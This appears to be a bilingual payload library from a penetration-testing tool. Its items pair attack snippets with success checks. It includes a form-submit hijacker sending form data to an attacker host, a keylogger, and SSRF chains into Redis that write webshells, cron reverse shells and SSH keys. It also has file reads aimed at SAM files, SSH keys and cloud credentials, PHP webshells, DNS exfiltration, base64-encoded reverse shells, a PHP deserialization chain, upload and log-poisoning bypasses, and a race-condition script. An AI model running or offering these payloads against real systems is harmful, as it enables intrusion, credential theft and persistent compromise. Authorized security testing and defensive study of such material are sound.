document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://{ATTACKER_HOST}/log?" + new URLSearchParams(data).toString();
  });
});
</script>

description.zh: 劫持 form submit 外发完整表单数据；收集端收到表单字段集即确认提交劫持可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Hijack form submit events and exfiltrate the FormData; the form field set arriving at the collector confirms submit hijacking. {ATTACKER_HOST} renders to your collection server.

description.zh: 以十六进制混淆监听 keydown 外发按键；收集端仍收到按键即确认混淆版本可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Listen for keydown via hex-obfuscated identifiers and exfiltrate keys; keystrokes still arriving confirm the obfuscated variant works. {ATTACKER_HOST} renders to your collection server.

description.zh: 用目标主机与端口上的捕获器验证 gopher 任意 TCP 转发；捕获器收到 _COMMAND 行与结尾 _PAYLOADER_LAB 标记即确认 TCP 标记链路可用。
description.en: Validate arbitrary gopher TCP forwarding against a capture service on the target host and port; receiving the _COMMAND line and trailing _PAYLOADER_LAB marker confirms the TCP marker path.

description.zh: 提交 gopher 封装的 Redis cron 写入序列；计划任务落地且反弹连接到达监听端口即确认持久化写入成功。
description.en: Submit the gopher-wrapped Redis cron-write sequence; the cron entry landing and a reverse connection arriving on the listener port confirm persistence.

description.zh: 向目标 80 端口提交 gopher 封装的 HTTP 请求；返回 /admin 响应且 Host 头为目标主机，即确认 gopher HTTP 桥接可用。
description.en: Submit a gopher-wrapped HTTP request to target port 80; a returned /admin response with the target Host header confirms gopher HTTP bridging.

description.zh: 提交双重 URL 编码的 RESP 帧变体；捕获器解码后收到合法 RESP，即确认二次解码可绕过单层过滤。
description.en: Submit the double-URL-encoded RESP frame variant; a valid RESP after decoding on the capture service confirms double-decoding bypasses single-pass filtering.

description.zh: 向目标主机与端口发送 dict 探测命令；捕获器收到探测命令行即确认 dict scheme 端口边界。
description.en: Send the dict probe command to the target host and port; the capture service receiving the command line confirms the dict-scheme port boundary.

description.zh: 对回环 6379 发送 info 与 keys 命令；返回 Redis 信息或键列表即确认 dict 可与 Redis 交互。
description.en: Send info and keys to loopback 6379; a returned Redis info block or key list confirms dict interaction with Redis.

description.zh: 对回环 11211 发送 stats 与 get 命令；返回统计文本或键值即确认 Memcached 可经 dict 探测。
description.en: Send stats and get to loopback 11211; returned stats text or key values confirms Memcached probing via dict.

description.zh: 按序执行 set、config、save 序列；Web 根目录出现 shell.php 且可被解析，即确认 dict 可写入 WebShell。
description.en: Execute the set, config, and save sequence in order; shell.php appearing in the web root and parsing confirms WebShell writing via dict.

description.zh: 提交百分号编码的命令变体；捕获器解码后收到 set 命令，即确认编码绕过单层过滤。
description.en: Submit the percent-encoded command variant; a decoded set command on the capture service confirms encoding bypasses single-pass filtering.

description.zh: 逐条读取 Windows 敏感文件；返回 win.ini、SAM 或私钥内容即确认 Windows 路径可读。
description.en: Read each sensitive Windows file; returned win.ini, SAM, or key content confirms Windows paths are readable.

description.zh: 逐条读取 Web 应用配置；返回数据库连接串或应用密钥即确认配置文件可被窃取。
description.en: Read each web-application configuration file; returned connection strings or application secrets confirm configuration theft.

description.zh: 逐条读取云环境凭据文件；返回 serviceaccount token 或 AWS credentials 即确认云凭据可被窃取。
description.en: Read each cloud-credential file; a returned serviceaccount token or AWS credentials file confirms cloud-credential theft.

description.zh: 逐条读取 SSH 私钥路径；返回 OPENSSH PRIVATE KEY 内容即确认私钥可被窃取。
description.en: Read each SSH private-key path; returned OPENSSH PRIVATE KEY content confirms private-key theft.

description.zh: 以大小写混合提交 file scheme 与路径；混合大小写仍返回内容而标准形式被拦，即确认大小写校验缺口。
description.en: Submit the file scheme and paths in mixed case; mixed-case content while the canonical form is blocked confirms a case-check gap.

description.zh: 逐条提交八进制、整数、十六进制与通配 DNS 回环变体并对比拦截；过滤拦截 127.0.0.1 而某变体返回回环内容，即确认地址规范化缺口。
description.en: Submit octal, integer, hex, and wildcard-DNS loopback variants; a variant returning loopback content while 127.0.0.1 is blocked confirms an address-canonicalization gap.

description.zh: 提交解析器差异 URL 并对比请求落点；带外域名收到回连或返回歧义内容，即确认解析歧义绕过过滤。
description.en: Submit parser-differential URLs and compare request destinations; an out-of-band hit or ambiguous content confirms parsing ambiguity bypasses the filter.

description.zh: 经开放重定向跳转到回环地址；取回器跟随跳转并返回 127.0.0.1 内容，即确认重定向链绕过成立。
description.en: Chain an open redirect to a loopback address; the fetcher following the redirect and returning 127.0.0.1 content confirms redirect-chain bypass.

description.zh: 提交 sslip.io 与 nip.io 回环域名；解析到回环且返回内容，即确认主机名白名单可被通配 DNS 绕过。
description.en: Submit sslip.io and nip.io loopback names; resolution to loopback with returned content confirms wildcard-DNS bypass of hostname allowlists.

description.zh: 逐条提交 IPv6 回环变体；任一形式返回回环内容而标准 127.0.0.1 被拦，即确认 IPv6 过滤缺口。
description.en: Submit each IPv6 loopback variant; a form returning loopback content while 127.0.0.1 is blocked confirms an IPv6 filtering gap.

description.zh: 提交百分号编码、空字节与 CRLF 变体；某变体使解析器拆分出回环目标或注入 Host 头，即确认编码与 CRLF 缺口。
description.en: Submit percent-encoding, null-byte, and CRLF variants; a variant splitting the parser toward a loopback target or injecting a Host header confirms encoding and CRLF gaps.

description.zh: 提交混合进制 IP 变体；任一形式解析为 127.0.0.1 且被取回，即确认进制规范化缺口。
description.en: Submit mixed-radix IP variants; any form resolving to 127.0.0.1 and fetched confirms a radix-normalization gap.

description.zh: 对回环 6379 发送 dict info 与 gopher PING；返回 Redis 信息或 +PONG 即确认 Redis 可达。
description.en: Send dict info and a gopher PING to loopback 6379; returned Redis info or +PONG confirms Redis reachability.

description.zh: 按序执行 set、config、save 序列写入 WebShell；Web 根出现 shell.php 且可解析即确认持久化成功。
description.en: Execute the set, config, and save sequence to write a WebShell; shell.php appearing in the web root and parsing confirms persistence.

description.zh: 写入 SSH 公钥到 authorized_keys；使用对应私钥可登录目标 root 账户即确认公钥持久化成功。
description.en: Write the SSH public key into authorized_keys; logging in to the target root account with the matching private key confirms key persistence.

description.zh: 写入 cron 反弹任务；反弹连接到达监听地址与端口即确认 cron 持久化成功。
description.en: Write the cron reverse task; a reverse connection arriving on the listener address and port confirms cron persistence.

description.zh: 运行 rogue server 加载 Redis 模块；Redis 日志出现 MODULE LOAD 且主从同步完成，即确认 rogue 加载链路可用。
description.en: Run the rogue server to load a Redis module; MODULE LOAD in Redis logs with completed replication confirms the rogue-load path.

description.zh: 提交 RESP PING 帧；返回 +PONG 即确认 gopher 到 Redis 的单命令链路。
description.en: Submit the RESP PING frame; a +PONG reply confirms the single-command gopher-to-Redis path.

description.zh: 列举 eval、assert、preg_replace /e、create_function、array_map、call_user_func 等动态执行形态。命中判据：对应参数传入后返回执行结果（如 cmd=id 返回 uid=…）。
description.en: Lists dynamic-execution forms such as eval, assert, preg_replace /e, create_function, array_map, and call_user_func. Success check: passing the paired parameters returns executed output (e.g. cmd=id yields uid=...).

description.zh: 列举 system、exec、shell_exec、passthru、popen、proc_open 与反引号的命令执行形态。命中判据：页面输出 whoami 的当前用户名。
description.en: Lists command-execution forms of system, exec, shell_exec, passthru, popen, proc_open, and backticks. Success check: the page prints the current username from whoami.

description.zh: 部署 @eval/@assert/@system 一句话木马后通过 cmd 参数连接。命中判据：POST cmd=id 后响应包含 uid=… 输出。
description.en: Deploys @eval/@assert/@system one-line webshells and connects through the cmd parameter. Success check: posting cmd=id returns uid=... output.

description.zh: 用动态属性调用、函数名拼接与 Base64 还原 assert 构造变形一句话。命中判据：传入 cmd 后同样返回命令输出。
description.en: Builds obfuscated one-line webshells with dynamic property calls, concatenated names, and Base64-restored assert. Success check: passing cmd likewise returns command output.

description.zh: 经 array_map、call_user_func 与变量函数间接调用 assert。命中判据：cmd 参数传入后返回命令输出。
description.en: Invokes assert indirectly via array_map, call_user_func, and variable functions. Success check: passing cmd returns command output.

description.zh: 由 GET 参数 func 与 cmd 决定动态调用。命中判据：func=assert&cmd=id 时响应包含 uid=…。
description.en: Lets GET parameters func and cmd drive the dynamic call. Success check: func=assert&cmd=id yields uid=... in the response.

description.zh: 提交 iconv 与 base64 组合的完整 php://filter 链作为包含参数。命中判据：包含执行后输出经链变换的可控内容（按链解码还原为种子 PHP 代码）。
description.en: Submits a full php://filter chain combining iconv and base64 as the inclusion parameter. Success check: inclusion emits chain-transformed controllable content that decodes back to the seed PHP code.

description.zh: 通过 nslookup/ping/host 把 whoami、id 输出编码进攻击者域名的子域查询，Windows 行使用 %USERNAME%。命中判据：攻击者 DNS 权威日志收到携带该输出的查询。
description.en: Encodes whoami/id output into subdomain queries to the attacker domain via nslookup/ping/host; the Windows line uses %USERNAME%. Success check: the attacker DNS authoritative log receives queries carrying that output.

description.zh: 注入 bash /dev/tcp、nc -e 与 python socket 反弹 Shell 连接授权监听器。命中判据：监听端接受连接并能执行 whoami 取得返回。
description.en: Injects bash /dev/tcp, nc -e, and python socket reverse shells toward an authorized listener. Success check: the listener accepts the connection and whoami returns output.

description.zh: 将反弹 Shell 命令 Base64 编码后经 echo|base64 -d|bash 解码执行，验证绕过对明文反弹命令关键字的过滤。复制后需将 Base64 解码内容中的回连 IP 与端口改为自有监听地址并重新编码。命中判据：过滤器放行该请求且监听器收到反弹连接。
description.en: Base64-encodes a reverse-shell command and runs it through echo|base64 -d|bash to bypass plaintext-keyword filtering. After copying, change the callback IP and port inside the Base64-decoded content to your own listener and re-encode. Success check: the filter lets the request pass and the listener receives the reverse connection.

patches.expectedCommand:
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>

description.zh: 构造 Chain.__destruct 调用 Action.action 再触发 system 的两级 POP 链并输出其序列化串。命中判据：反序列化点还原对象链后返回 whoami 的当前用户名。
description.en: Builds a two-level POP chain where Chain.__destruct calls Action.action which triggers system, and prints its serialized form. Success check: after the deserialization sink restores the object chain, whoami returns the current username.

description.zh: 以带 PHP eval 标记的 User-Agent 请求目标使其写入访问日志，再经文件包含参数加载该日志并传入 cmd 参数验证代码执行。命中判据：包含日志并传入 cmd=whoami 后响应输出当前用户名。
description.en: Send a PHP-tagged User-Agent that is written to the access log, then include the log through the file parameter and pass a cmd parameter to verify execution. Success check: including the log with cmd=whoami prints the current username.

description.en: Repeat the same inclusion flow against the Nginx access log path to confirm reachability across server log layouts. Success check: including the Nginx log likewise returns command output.

title.zh: 对 Nginx 日志路径重复包含验证

AddType application/x-httpd-php .jpg
# 之后直接访问图片马
http://{LAB_APP}/upload/shell.jpg

description.zh: 在 Apache 配置 AddType application/x-httpd-php .jpg 后访问上传目录中的 shell.jpg，验证扩展名黑名单可被 MIME 映射绕过。命中判据：shell.jpg 按 PHP 执行并返回命令输出。
description.en: Map .jpg to the PHP handler with AddType in the Apache config and request the uploaded shell.jpg, verifying extension blacklists are bypassed by MIME mapping. Success check: shell.jpg is executed as PHP and returns command output.

description.zh: 经文件包含参数与 phar:// 流访问已上传的 shell.jpg，验证图片内 PHP 代码或元数据在包含/解析时执行。命中判据：包含 shell.jpg 后传入 cmd=whoami 返回当前用户名。
description.en: Reach the uploaded shell.jpg through an inclusion parameter and the phar:// stream, verifying embedded PHP code or metadata executes on inclusion or parsing. Success check: including shell.jpg with cmd=whoami returns the current username.

description.zh: 以通用实体请求收集端；{LAB_OAST} 收到该请求即确认解析器出站可达，可作为无回显场景的关联探针。
description.en: Request the collector via a general entity; the request arriving at {LAB_OAST} confirms parser egress and doubles as the correlation probe for blind scenarios.

description.zh: 以参数实体加载远端 DTD；{LAB_OAST} 收到 DTD 请求即确认参数实体外部加载可用。
description.en: Load a remote DTD via a parameter entity; the DTD request arriving at {LAB_OAST} confirms external parameter-entity loading.

import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())
